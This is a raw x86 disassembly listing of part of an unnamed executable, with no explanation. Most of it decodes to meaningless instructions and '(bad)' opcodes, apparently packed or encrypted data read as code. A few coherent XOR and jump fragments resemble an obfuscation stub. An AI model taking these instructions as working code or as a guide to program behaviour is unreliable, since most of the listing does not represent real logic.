  40dab8:	shl    DWORD PTR [ebx-0x2bc34c26],1
  40dabe:	out    dx,al
  40dabf:	fwait
  40dac0:	xchg   ecx,eax
  40dac1:	mov    dh,0x94
  40dac3:	sub    al,BYTE PTR [ecx]
  40dac5:	xchg   esp,eax
  40dac6:	sar    BYTE PTR [edx],1
  40dac8:	mov    bl,ah
  40daca:	test   al,0x5
  40dacc:	xor    BYTE PTR [ebx+0x16205863],bh
  40dad2:	test   al,0xbe
  40dad4:	mov    edx,DWORD PTR [edi-0x1834fc4e]
  40dada:	int3   
  40dadb:	leave  
  40dadc:	pop    ecx
  40dadd:	and    BYTE PTR [esi+0x49],ah
  40dae0:	push   ds
  40dae1:	sub    al,0x6a
  40dae3:	rol    BYTE PTR [ecx-0x7f15debc],0xf5
  40daea:	dec    eax
  40daeb:	in     eax,dx
  40daec:	sub    al,0x3b
  40daee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daef:	mov    ds,ecx
  40daf1:	and    DWORD PTR [eax+0x45c312e8],0xffffffcc
  40daf8:	push   ss
  40daf9:	sub    esp,edx
  40dafb:	dec    esp
  40dafc:	cmc    
  40dafd:	les    edx,FWORD PTR [eax-0x3c]
  40db00:	mov    cl,0x13
  40db02:	or     BYTE PTR [eax],ah
  40db04:	mov    ebp,0xd714a779
  40db09:	fimul  DWORD PTR [esi-0x5d]
  40db0c:	push   eax
  40db0d:	cmp    dl,bh
  40db0f:	clc    
  40db10:	xchg   BYTE PTR [esi-0x50],bl
  40db13:	aaa    
  40db14:	xchg   ebx,eax
  40db15:	adc    BYTE PTR [esi],cl
  40db17:	cdq    
  40db18:	jae    0x40db6c
  40db1a:	cld    
  40db1b:	jmp    0x5e90:0x41b3316c
  40db22:	pop    edx
  40db23:	add    eax,0xdd7e3c82
  40db28:	js     0x40dab7
  40db2a:	std    
  40db2b:	dec    esi
  40db2c:	push   0x31
  40db2e:	mov    WORD PTR [eax-0x70],?
  40db31:	das    
  40db32:	(bad)  
  40db33:	ins    BYTE PTR es:[edi],dx
  40db34:	adc    al,0x69
  40db36:	hlt    
  40db37:	adc    BYTE PTR [ecx-0x31],dh
  40db3a:	push   esp
  40db3b:	(bad)  [eax]
  40db3d:	jne    0x40db9d
  40db3f:	clc    
  40db40:	icebp  
  40db41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db42:	imul   esi,ebp,0xfffffffb
  40db45:	loope  0x40dad0
  40db47:	add    dl,BYTE PTR [ecx+0x66f336ad]
  40db4d:	pop    es
  40db4e:	jbe    0x40dbb1
  40db50:	mov    cl,0x8
  40db52:	add    BYTE PTR [ebx-0x3f],cl
  40db55:	(bad)  
  40db56:	and    al,BYTE PTR [esi+0x764f9913]
  40db5c:	jmp    0x40db31
  40db5e:	mov    bp,0x659f
  40db62:	xchg   BYTE PTR [ecx+0x67d6ae10],dl
  40db68:	loopne 0x40db13
  40db6a:	outs   dx,BYTE PTR ds:[esi]
  40db6b:	push   ds
  40db6c:	jo     0x40daff
  40db6e:	mov    bh,0xc1
  40db70:	ret    
  40db71:	mov    cs,WORD PTR [ecx-0x51]
  40db74:	push   ecx
  40db75:	dec    edx
  40db76:	(bad)  
  40db77:	jge    0x40db30
  40db79:	shl    DWORD PTR [esi],cl
  40db7b:	mul    BYTE PTR [esi-0x1373fe4e]
  40db81:	pop    ebp
  40db82:	(bad)  
  40db83:	xchg   esi,eax
  40db84:	or     al,0xc2
  40db86:	add    BYTE PTR [eax+0x6d25ae99],bl
  40db8c:	out    dx,eax
  40db8d:	inc    eax
  40db8e:	inc    edi
  40db8f:	ret    
  40db90:	inc    edi
  40db91:	jle    0x40dbcf
  40db93:	or     DWORD PTR [eax+0x29],ebp
  40db96:	sub    BYTE PTR [edi+ebp*2+0x4e],ch
  40db9a:	sub    edi,DWORD PTR [ecx+0x67]
  40db9d:	mov    bl,0xca
  40db9f:	mov    esp,0xd72abb6d
  40dba4:	xor    BYTE PTR [ebx-0x49],dl
  40dba7:	in     al,0xe3
  40dba9:	add    eax,0xbc4d8ef1
  40dbae:	adc    BYTE PTR [ebx+0x65eae49],0x6e
  40dbb5:	cmp    eax,ecx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x5d40145c],0xfae5519c
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dbcb
  40dbe0:	addr16 loope 0x40db83
  40dbe3:	jb     0x40db97
  40dbe5:	adc    edx,DWORD PTR [ebp-0x39efbefe]
  40dbeb:	add    dl,BYTE PTR [ebx+0x40a8c2f6]
  40dbf1:	int    0xb8
  40dbf3:	xchg   esp,eax
  40dbf4:	adc    al,0xe9
  40dbf6:	pop    ebx
  40dbf7:	addr16 xor eax,0xf17df7c5
  40dbfd:	inc    edx
  40dbfe:	push   es
  40dbff:	xor    DWORD PTR [ecx+0xd],esi
  40dc02:	(bad)  
  40dc03:	mov    eax,0xee54ebac
  40dc08:	pop    ebp
  40dc09:	(bad)  
  40dc0a:	sub    cl,ah
  40dc0c:	rcl    DWORD PTR [edi+0x65],0xa4
  40dc10:	and    bl,0x2c
  40dc13:	pusha  
  40dc14:	jle    0x40dc37
  40dc16:	inc    edx
  40dc17:	jo     0x40dbf7
  40dc19:	dec    ebp
  40dc1a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc1c:	and    al,BYTE PTR es:[ebp-0x26]
  40dc20:	or     ebp,DWORD PTR [ebx+0x5691073b]
  40dc26:	fld    TBYTE PTR [edx-0x74]
  40dc29:	sbb    al,0x35
  40dc2b:	test   eax,0xd372eb56
  40dc30:	jle    0x40dc1f
  40dc32:	add    edi,DWORD PTR [edx+0x40]
  40dc35:	push   es
  40dc36:	cwde   
  40dc37:	aaa    
  40dc38:	lock sbb al,0xc5
  40dc3b:	lods   eax,DWORD PTR ds:[esi]
  40dc3c:	fdivr  DWORD PTR [eax]
  40dc3e:	retf   0xb2e9
  40dc41:	and    eax,0xc5e213fd
  40dc46:	inc    edi
  40dc47:	(bad)  
  40dc49:	call   0xc732e453
  40dc4e:	jle    0x40dc60
  40dc50:	fld    st(5)
  40dc52:	mov    eax,ds:0x6890d0b0
  40dc57:	pop    ss
  40dc58:	(bad)  
  40dc59:	xchg   esi,eax
  40dc5a:	pop    edi
  40dc5b:	dec    edi
  40dc5c:	push   ecx
  40dc5d:	inc    esp
  40dc5e:	in     eax,0x4a
  40dc60:	inc    ebx
  40dc61:	jg     0x40dc93
  40dc63:	dec    ebx
  40dc64:	jge    0x40dc8d
  40dc66:	pusha  
  40dc67:	adc    DWORD PTR [ebx+0x79e7276b],eax
  40dc6d:	mov    DWORD PTR [edx],eax
  40dc6f:	add    esi,DWORD PTR [edi]
  40dc71:	cmp    dl,ah
  40dc73:	call   0xedbc:0x18ff6395
  40dc7a:	or     BYTE PTR [edx-0x6b],bl
  40dc7d:	bound  eax,QWORD PTR [ecx+0x25ab226a]
  40dc83:	shl    DWORD PTR [edx],1
  40dc85:	jnp    0x40dc28
  40dc87:	add    DWORD PTR [eax+0x52dfbcd],ecx
  40dc8d:	pop    ecx
  40dc8e:	mov    ebp,0x8847e5ca
  40dc93:	jbe    0x40dc9a
  40dc95:	ds es push edx
  40dc98:	jmp    0x322b4d0c
  40dc9d:	mov    bh,dl
  40dc9f:	xchg   DWORD PTR [ebx-0x16],esp
  40dca2:	call   0xaf8a77bb
  40dca7:	call   0x2f1bab3c
  40dcac:	sbb    eax,0x6e9ad25d
  40dcb1:	jmp    0x9e9a:0x30d094f1
  40dcb8:	mov    ds:0xe546f735,eax
  40dcbd:	(bad)  
  40dcbe:	inc    esi
  40dcbf:	mov    eax,0x97068983
  40dcc4:	push   ds
  40dcc5:	jno    0x40dce9
  40dcc7:	repnz sbb eax,0xb7306604
  40dccd:	cmp    al,0xce
  40dccf:	jmp    0x40dcd7
  40dcd1:	push   edi
  40dcd2:	ins    DWORD PTR es:[edi],dx
  40dcd3:	lds    edx,FWORD PTR [ebx-0x72]
  40dcd6:	jae    0x40dc5d
  40dcd8:	in     al,0x4e
  40dcda:	imul   edx,DWORD PTR [esi],0x7
  40dcdd:	inc    ebp
  40dcde:	xchg   ecx,edi
  40dce0:	mov    DWORD PTR ds:0x9c0fffac,ecx
  40dce6:	pop    edx
  40dce7:	mov    ah,cl
  40dce9:	inc    esi
  40dcea:	dec    ecx
  40dceb:	add    BYTE PTR [edi],bl
  40dced:	push   ds
  40dcee:	clc    
  40dcef:	sbb    ecx,DWORD PTR [ebx-0xc82eec2]
  40dcf5:	fwait
  40dcf6:	pop    esp
  40dcf7:	jp     0x40dce6
  40dcf9:	xor    al,0x73
  40dcfb:	push   esp
  40dcfc:	(bad)  
  40dcfd:	ror    DWORD PTR [ebx+0x1287523f],1
  40dd03:	cmc    
  40dd04:	pop    dx
  40dd06:	out    dx,al
  40dd07:	(bad)
  40dd0a:	cmp    dl,BYTE PTR [ebp-0x1e]
  40dd0d:	test   eax,0x5f9757eb
  40dd12:	in     eax,dx
  40dd13:	retf   0x5b8
  40dd16:	jnp    0x40dcc8
  40dd18:	iret   
  40dd19:	jb     0x40dcf3
  40dd1b:	mov    eax,0xd69eb2cf
  40dd20:	stos   DWORD PTR es:[edi],eax
  40dd21:	xchg   edi,eax
  40dd22:	ficom  DWORD PTR [eax+0x2c]
  40dd25:	clc    
  40dd26:	mov    bh,0x17
  40dd28:	outs   dx,DWORD PTR ds:[esi]
  40dd29:	mov    ecx,0xbbf14e2b
  40dd2e:	(bad)  
  40dd30:	mov    bl,0x11
  40dd32:	xchg   DWORD PTR [eax+0x7e],ecx
  40dd35:	mov    ah,0x2a
  40dd37:	out    dx,al
  40dd38:	dec    ebp
  40dd39:	adc    eax,0x39f8481f
  40dd3e:	dec    edx
  40dd3f:	xchg   BYTE PTR [ebp+0x67],bl
  40dd42:	cmp    eax,0xba41400
  40dd47:	retf   
  40dd48:	jmp    0x790e:0x15b9d06a
  40dd4f:	sbb    ah,BYTE PTR [esi+0x3b54b2a1]
  40dd55:	outs   dx,DWORD PTR ds:[esi]
  40dd56:	ret    0xc704
  40dd59:	xor    DWORD PTR [ebp-0x73],edx
  40dd5c:	jnp    0x40dd58
  40dd5e:	dec    eax
  40dd5f:	int3   
  40dd60:	aam    0xfc
  40dd62:	outs   dx,DWORD PTR ds:[esi]
  40dd63:	and    ch,bh
  40dd65:	data16 loopne 0x40dd7b
  40dd68:	sbb    eax,0x7c924b71
  40dd6d:	in     al,dx
  40dd6e:	push   esi
  40dd6f:	xlat   BYTE PTR ds:[ebx]
  40dd70:	jg     0x40ddee
  40dd72:	or     eax,0x9efd3621
  40dd77:	fild   DWORD PTR [edi]
  40dd79:	mov    bl,BYTE PTR [ebx]
  40dd7b:	ds push 0x4e989d6a
  40dd81:	je     0x40dd55
  40dd83:	mov    ecx,0xdb905f1
  40dd88:	pusha  
  40dd89:	dec    ebx
  40dd8a:	pop    esi
  40dd8b:	fwait
  40dd8c:	clc    
  40dd8d:	in     eax,dx
  40dd8e:	ret    
  40dd8f:	fwait
  40dd90:	push   eax
  40dd91:	jae    0x40dd2e
  40dd93:	mov    bh,0x52
  40dd95:	sbb    bl,0xf9
  40dd98:	push   eax
  40dd99:	pop    edx
  40dd9a:	xchg   ecx,esi
  40dd9c:	je     0x40dd68
  40dd9e:	xchg   DWORD PTR [edx+edx*4+0x39],esi
  40dda2:	or     BYTE PTR [ebx-0x287ead6f],bl
  40dda8:	das    
  40dda9:	mov    ds:0x2d9dc88c,al
  40ddae:	je     0x40dd30
  40ddb0:	push   cs
  40ddb1:	mov    esp,0xb490d768
  40ddb6:	and    cl,ah
  40ddb8:	sbb    eax,0xddce2922
  40ddbd:	sbb    al,0xa
  40ddbf:	jl     0x40dde2
  40ddc1:	retf   0xe4cc
  40ddc4:	in     eax,0x9b
  40ddc6:	out    0x7,al
  40ddc8:	mov    edx,0x21b3225b
  40ddcd:	das    
  40ddce:	xlat   BYTE PTR ds:[ebx]
  40ddcf:	outs   dx,BYTE PTR ds:[esi]
  40ddd0:	sbb    al,0xa5
  40ddd2:	mov    ch,0x93
  40ddd4:	and    eax,0xb4bdc432
  40ddd9:	xchg   esp,eax
  40ddda:	popf   
  40dddb:	outs   dx,BYTE PTR ds:[esi]
  40dddc:	ret    0x4d19
  40dddf:	sbb    cl,dh
  40dde1:	pop    ds
  40dde2:	mov    BYTE PTR [ebp+0x1d687d0d],dh
  40dde8:	jae    0x40ddf4
  40ddea:	mov    ds:0xb17aac65,eax
  40ddef:	xchg   cl,ah
  40ddf1:	pop    esi
  40ddf2:	loope  0x40de34
  40ddf4:	ret    
  40ddf5:	mov    ah,0x7b
  40ddf7:	mov    ebx,0x1d68c0db
  40ddfc:	jbe    0x40ddec
  40ddfe:	(bad)  
  40ddff:	sbb    eax,0xa5d6eb14
  40de04:	jp     0x40de48
  40de06:	outs   dx,BYTE PTR ds:[esi]
  40de07:	mov    al,0x8e
  40de09:	inc    ecx
  40de0a:	bound  eax,QWORD PTR [edx-0x8a828a3]
  40de10:	out    0xc6,al
  40de12:	pop    edi
  40de13:	mov    dl,0x7f
  40de15:	pop    ecx
  40de16:	pop    ecx
  40de17:	aad    0xf
  40de19:	push   ds
  40de1a:	cli    
  40de1b:	retf   0x7a08
  40de1e:	adc    BYTE PTR [ebx],al
  40de20:	(bad)  
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43371f,0x0
  40de5a:	mov    eax,ds:0x43371f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43371f,eax
  40de65:	cmp    DWORD PTR ds:0x43371f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43371f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43376f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	mul    ebx
  40dea7:	cmp    DWORD PTR [edi],edx
  40dea9:	(bad)  
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40ded1
  40deb3:	jne    0x40deda
  40deb5:	xor    BYTE PTR [edx+0x7c],dh
  40deb8:	ret    
  40deb9:	cdq    
  40deba:	daa    
  40debb:	or     eax,0xcc15746e
  40dec0:	cdq    
  40dec1:	or     DWORD PTR [edx],edi
  40dec3:	in     al,dx
  40dec4:	sub    ah,BYTE PTR [ecx+0x162b7cec]
  40deca:	sbb    edi,DWORD PTR [ecx]
  40decc:	retf   
  40decd:	sub    ch,BYTE PTR [edx+0x71be0b3a]
  40ded3:	out    0x17,eax
  40ded5:	add    dh,ah
  40ded7:	or     eax,0xd97839ff
  40dedc:	add    BYTE PTR [esi],al
  40dede:	daa    
  40dedf:	fs pop edi
  40dee1:	outs   dx,BYTE PTR ds:[esi]
  40dee2:	cmp    DWORD PTR [ebx-0x6a],edx
  40dee5:	stos   DWORD PTR es:[edi],eax
  40dee6:	mov    ah,0x88
  40dee8:	sub    al,0xfe
  40deea:	pop    eax
  40deeb:	cmp    cl,0xee
  40deee:	push   ss
  40deef:	adc    DWORD PTR [esi+0x4a9d193e],ecx
  40def5:	ret    
  40def6:	jmp    0xb75ff53f
  40defb:	loopne 0x40df11
  40defd:	aam    0x68
  40deff:	ret    
  40df00:	mov    WORD PTR ds:0xccf896aa,cs
  40df06:	ja     0x40df28
  40df08:	bound  ebp,QWORD PTR [ecx+ebp*2-0x6222b66d]
  40df0f:	mov    ah,0x16
  40df11:	pop    es
  40df12:	mov    cl,0x8f
  40df14:	cmc    
  40df15:	scas   eax,DWORD PTR es:[edi]
  40df16:	pop    ss
  40df17:	dec    esp
  40df18:	pusha  
  40df19:	push   ss
  40df1a:	mov    ds:0x763790c7,eax
  40df1f:	in     eax,0xb8
  40df21:	inc    edx
  40df22:	ds push esp
  40df24:	adc    edi,DWORD PTR [ecx-0xd]
  40df27:	aaa    
  40df28:	push   0xc96b40b8
  40df2d:	pop    esi
  40df2e:	mov    bl,0xe0
  40df30:	cmp    al,0x0
  40df32:	jge    0x40df94
  40df34:	sbb    ah,bl
  40df36:	mov    dh,0x43
  40df38:	cdq    
  40df39:	test   al,0x8
  40df3b:	or     DWORD PTR [esi],0xffffffbe
  40df3e:	pop    esi
  40df3f:	in     al,0xa
  40df41:	aad    0x54
  40df43:	push   edx
  40df44:	push   ebx
  40df45:	xor    DWORD PTR cs:[esi+0x425e34d7],ebx
  40df4c:	jo     0x40df56
  40df4e:	push   es
  40df4f:	add    DWORD PTR [edi-0x24d373fa],0xf58bc498
  40df59:	sbb    bh,BYTE PTR [edx+0x3a]
  40df5c:	mov    ebp,0xbdabe141
  40df61:	pop    eax
  40df62:	jno    0x40dfc7
  40df64:	out    dx,al
  40df65:	loopne 0x40df9a
  40df67:	inc    ebp
  40df68:	dec    eax
  40df69:	iret   
  40df6a:	mov    esi,0x4f0cf720
  40df6f:	and    eax,0x5eee2aba
  40df74:	iret   
  40df75:	jae    0x40df8b
  40df77:	popa   
  40df78:	loop   0x40df56
  40df7a:	add    DWORD PTR [edi],ebx
  40df7c:	scas   al,BYTE PTR es:[edi]
  40df7d:	call   0xcb7:0xb8a6e7b5
  40df84:	aad    0xd6
  40df86:	jmp    0x9a4b:0x6b654de9
  40df8d:	lahf   
  40df8e:	add    DWORD PTR [ebx+0x28],ecx
  40df91:	sbb    eax,0x59c16485
  40df96:	xlat   BYTE PTR ds:[ebx]
  40df97:	mov    eax,ds:0x427b578e
  40df9c:	int    0xde
  40df9e:	push   cs
  40df9f:	push   ebx
  40dfa0:	shl    BYTE PTR [ebx],0x2
  40dfa3:	xchg   ecx,eax
  40dfa4:	retf   
  40dfa5:	xchg   BYTE PTR [ecx-0xa],bh
  40dfa8:	pop    ds
  40dfa9:	out    0x43,al
  40dfab:	xchg   ecx,eax
  40dfac:	scas   al,BYTE PTR es:[edi]
  40dfad:	sets   BYTE PTR [esi+0x72]
  40dfb1:	dec    eax
  40dfb2:	pop    ebx
  40dfb3:	inc    ebx
  40dfb4:	fdivr  QWORD PTR [ebx]
  40dfb6:	jno    0x40df3e
  40dfb8:	add    al,0xcf
  40dfba:	mov    eax,ds:0x673e4db8
  40dfbf:	loopne 0x40df8f
  40dfc1:	or     DWORD PTR [edx+eax*4-0x18046cce],ecx
  40dfc8:	mov    edx,0x39cac623
  40dfcd:	mov    eax,DWORD PTR fs:[ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433717,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x43376b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	inc    DWORD PTR [esi]
  40e005:	sbb    BYTE PTR [edi+0x7e7e9d5e],ah
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e061
  40e010:	out    dx,al
  40e011:	ds sbb al,0x27
  40e014:	call   0x5a0e48f6
  40e019:	add    edx,DWORD PTR [ebx]
  40e01b:	es retf 
  40e01d:	mov    bh,0x64
  40e01f:	into   
  40e020:	push   ss
  40e021:	out    0xa9,eax
  40e023:	mov    ecx,DWORD PTR [eax-0xfd81018]
  40e029:	mov    edi,0x9edee8b3
  40e02e:	loopne 0x40e097
  40e030:	cmp    ebx,DWORD PTR [esp+ecx*8]
  40e033:	cdq    
  40e034:	adc    al,0x6b
  40e036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e037:	xchg   DWORD PTR [ebx+0x36],esi
  40e03a:	lea    eax,[eiz*2+0x789f1ef7]
  40e041:	mov    ch,0x1
  40e043:	iret   
  40e044:	arpl   WORD PTR [edx-0x3a6f528b],ax
  40e04a:	add    al,0x3e
  40e04c:	pop    ss
  40e04d:	xor    ebp,DWORD PTR [ecx+0x57d3e415]
  40e053:	call   0x706c26d3
  40e058:	xchg   esi,eax
  40e059:	mov    ah,0x89
  40e05b:	adc    eax,0x5a216168
  40e060:	jmp    0x4742:0xbb76ae6d
  40e067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e068:	jmp    0xda387d39
  40e06d:	sub    edi,DWORD PTR [edx]
  40e06f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e070:	sti    
  40e071:	jp     0x40e08c
  40e073:	sti    
  40e074:	scas   al,BYTE PTR es:[edi]
  40e075:	int3   
  40e076:	inc    edi
  40e077:	fdiv   QWORD PTR [ebx-0x67c34e4c]
  40e07d:	mov    esi,0x1b3a343d
  40e082:	dec    ebx
  40e083:	ins    DWORD PTR es:[edi],dx
  40e084:	fdivr  QWORD PTR [edx+0x4c]
  40e087:	test   BYTE PTR [ebx],ch
  40e089:	xor    esp,DWORD PTR [ebx]
  40e08b:	das    
  40e08c:	inc    esp
  40e08d:	mov    esp,0xb625dd51
  40e092:	push   ebp
  40e093:	sub    BYTE PTR [ebx],ah
  40e095:	add    al,0xe
  40e097:	sbb    DWORD PTR [ebp-0x69],esi
  40e09a:	jne    0x40e082
  40e09c:	in     al,dx
  40e09d:	push   eax
  40e09e:	and    al,0x7c
  40e0a0:	push   esi
  40e0a1:	test   al,0xfc
  40e0a3:	pop    edx
  40e0a4:	add    DWORD PTR [ecx-0x262bd2f3],0xadc1ffb2
  40e0ae:	push   ebx
  40e0af:	mov    ch,0x7a
  40e0b1:	dec    ecx
  40e0b2:	scas   al,BYTE PTR es:[edi]
  40e0b3:	xor    BYTE PTR [edi-0x5f],0xbe
  40e0b7:	dec    ecx
  40e0b8:	mov    ch,0x29
  40e0ba:	mov    ds:0xb8d3eeb8,eax
  40e0bf:	out    dx,al
  40e0c0:	(bad)  
  40e0c1:	jp     0x40e0ba
  40e0c3:	sti    
  40e0c4:	xchg   ebp,eax
  40e0c5:	xchg   DWORD PTR ds:0x59b9a162,eax
  40e0cb:	test   al,0xde
  40e0cd:	jno    0x40e0b3
  40e0cf:	dec    esi
  40e0d0:	jb     0x40e059
  40e0d2:	add    DWORD PTR [edx],eax
  40e0d4:	xchg   esp,eax
  40e0d5:	loopne 0x40e10b
  40e0d7:	cmp    al,BYTE PTR [edx-0x14]
  40e0da:	mov    ah,0xba
  40e0dc:	(bad)  
  40e0dd:	repz loopne 0x40e107
  40e0e0:	fiadd  WORD PTR [eax+0x3b37b7b8]
  40e0e6:	into   
  40e0e7:	jae    0x40e0e3
  40e0e9:	fs xchg edi,eax
  40e0eb:	mov    cl,0xfb
  40e0ed:	mov    BYTE PTR [ebp+0x19],dl
  40e0f0:	sti    
  40e0f1:	not    DWORD PTR [ecx]
  40e0f3:	out    dx,al
  40e0f4:	outs   dx,DWORD PTR ds:[esi]
  40e0f5:	or     al,0xb9
  40e0f7:	in     eax,dx
  40e0f8:	hlt    
  40e0f9:	inc    ebp
  40e0fa:	test   DWORD PTR [eax-0x24],0x6af6b5c5
  40e101:	ja     0x40e10a
  40e103:	icebp  
  40e104:	push   es
  40e105:	es dec ecx
  40e107:	adc    BYTE PTR ds:0x95eeb7f5,bl
  40e10d:	mov    edi,gs
  40e10f:	daa    
  40e110:	push   ecx
  40e111:	or     al,0x6
  40e113:	sub    DWORD PTR [ebx-0x61f14a3a],ecx
  40e119:	aas    
  40e11a:	aad    0xc
  40e11c:	jo     0x40e0b4
  40e11e:	cli    
  40e11f:	pop    esp
  40e120:	in     al,0xe0
  40e122:	loop   0x40e0b8
  40e124:	adc    al,BYTE PTR [ebp+0x4178dd1d]
  40e12a:	inc    esi
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x433723,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x43376f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	sti    
  40e15b:	inc    ecx
  40e15c:	inc    eax
  40e15d:	mov    eax,ds:0x7e7e9a72
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e132
  40e167:	ficom  WORD PTR [ebp-0x3d042bb5]
  40e16d:	or     BYTE PTR [ecx],cl
  40e16f:	dec    edx
  40e170:	es jl  0x40e127
  40e173:	mov    ch,0x35
  40e175:	sub    BYTE PTR [edi],cl
  40e177:	jno    0x40e192
  40e179:	call   0x73e1:0xec554e72
  40e180:	fnsave [eax+0x26]
  40e183:	mov    esi,0x40fe70e2
  40e188:	pmullw mm0,QWORD PTR [edi+0x468758f6]
  40e18f:	sub    BYTE PTR [edi+ecx*2+0x49],ch
  40e193:	xor    DWORD PTR [edx+0x5c],esi
  40e196:	(bad)  
  40e197:	jnp    0x40e18b
  40e199:	add    DWORD PTR [esi+0x104d9980],edx
  40e19f:	test   eax,0xfd46144c
  40e1a4:	out    0x80,eax
  40e1a6:	test   DWORD PTR [ebp*8-0x46f3dbb1],0xe8849bb7
  40e1b1:	mov    edi,0xaa4a42ed
  40e1b6:	cmp    DWORD PTR [edx],esi
  40e1b8:	push   ebp
  40e1b9:	in     al,dx
  40e1ba:	clc    
  40e1bb:	shl    dh,cl
  40e1bd:	cmp    dh,BYTE PTR [ebp-0x37]
  40e1c0:	int3   
  40e1c1:	xchg   ebp,eax
  40e1c2:	push   edi
  40e1c3:	mov    eax,0xc639f52
  40e1c8:	and    al,BYTE PTR [ebp+0xfcc3f68]
  40e1ce:	(bad)  
  40e1cf:	mov    al,0x9a
  40e1d1:	jl     0x40e247
  40e1d3:	out    0x76,eax
  40e1d5:	out    0xf0,al
  40e1d7:	pop    DWORD PTR [esi]
  40e1d9:	push   edx
  40e1da:	loop   0x40e242
  40e1dc:	test   cl,al
  40e1de:	retf   0xd468
  40e1e1:	push   ebx
  40e1e2:	leave  
  40e1e3:	mov    dl,BYTE PTR [edx+0x1266affd]
  40e1e9:	in     al,0x9
  40e1eb:	xchg   DWORD PTR [esi-0x47c694bd],eax
  40e1f1:	push   cs
  40e1f2:	int3   
  40e1f3:	adc    ah,BYTE PTR [edi]
  40e1f5:	jbe    0x40e265
  40e1f7:	shl    DWORD PTR [eax+0x5a],1
  40e1fa:	push   ebx
  40e1fb:	jge    0x40e269
  40e1fd:	test   DWORD PTR gs:[eax-0x2df8fc6c],0x19e97429
  40e208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e209:	lds    edi,FWORD PTR [ebp-0x7e]
  40e20c:	data16 jnp 0x40e249
  40e20f:	ror    DWORD PTR [ecx],1
  40e211:	dec    ebp
  40e212:	add    BYTE PTR [edx+0x2c],al
  40e215:	jg     0x40e243
  40e217:	fstp   st(0)
  40e219:	fbstp  TBYTE PTR [ebp-0x22]
  40e21c:	lods   eax,DWORD PTR ds:[esi]
  40e21d:	fimul  DWORD PTR [edi+0x81ae12e]
  40e223:	mov    eax,ds:0xa410b90d
  40e228:	dec    esp
  40e229:	sar    BYTE PTR [edx-0x73],1
  40e22c:	adc    BYTE PTR [eax+0x1d],cl
  40e22f:	pusha  
  40e230:	pop    ds
  40e231:	jae    0x40e26d
  40e233:	jp     0x40e2a8
  40e235:	ds call 0xa8e5:0x56ebdf8
  40e23d:	shr    BYTE PTR [ecx+0x48334ad9],cl
  40e243:	sbb    BYTE PTR [esi],cl
  40e245:	nop
  40e246:	push   cs
  40e247:	sub    ch,BYTE PTR [esi]
  40e249:	out    0x29,al
  40e24b:	out    0xce,eax
  40e24d:	dec    edx
  40e24e:	sahf   
  40e24f:	ror    BYTE PTR [di+0x3c],0xa1
  40e254:	xchg   esi,edi
  40e256:	sub    cl,bl
  40e258:	pop    ebx
  40e259:	xchg   edx,eax
  40e25a:	add    esi,DWORD PTR [esi]
  40e25c:	pop    ebx
  40e25d:	sti    
  40e25e:	cmp    al,0x39
  40e260:	xor    BYTE PTR [eax+0x70f6c8c],dl
  40e266:	sbb    DWORD PTR [edi-0x6429f990],ecx
  40e26c:	push   cs
  40e26d:	or     ebp,DWORD PTR [eax-0x46]
  40e270:	xchg   ebp,ebp
  40e272:	jno    0x40e226
  40e274:	cmp    cl,ch
  40e276:	push   esi
  40e277:	cdq    
  40e278:	(bad)  
  40e279:	(bad)  
  40e27a:	ds cmp al,0xf1
